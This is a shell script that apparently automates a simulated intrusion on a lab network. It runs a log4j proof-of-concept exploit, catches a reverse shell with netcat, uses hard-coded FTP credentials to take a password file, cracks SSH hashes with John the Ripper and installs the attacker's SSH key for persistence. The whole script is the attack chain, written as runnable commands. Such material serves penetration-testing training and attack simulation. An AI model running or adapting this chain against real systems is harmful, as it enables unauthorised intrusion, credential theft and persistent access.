#!/bin/sh

~/src/john/src/configure
cd ~/src/john/src; make -s clean && make -sj4

cd /home
#Scan web service for service versions
#nmap -sV 172.16.0.2

#Check if web server is vulnerable to log4j (response status 200 means vulnerable)
#./pwn.py --target http://172.16.0.2:8080 --exploit-host 172.16.0.9

#Start LDAP server
python3 /home/poc.py --userip 172.16.0.9 --webport 8000 --lport 9001 &

sleep 1

chmod 777 ./log4j.sh
#Run log4j exploit
bash ./log4j.sh &

#Start netcat to listen for reverse shell
nc -nlvp 9001

#Once connection received, enter "bash ./attacker.sh" to simulate cmds attacker would execute inside the shell to retrieve ftp credentials, then "exit" once done

#Using found credentials:
ftp 172.16.0.2
#Enter username "ross", password "joyofpainting"
#Inside ftp, enter "get pass.txt" to extract ssh credentials, "exit" to close ftp connection

#Crack ssh credentials
~/src/john/run/john --format=raw-sha512 /home/pass.txt

ssh bob@172.16.0.4
#Enter password cracked with john, "d0ck3r"

#Transfer attacker's public key over to ssh workstation for persistence
ssh-copy-id -i -f ~/.ssh/id_rsa.pub bob@172.16.0.4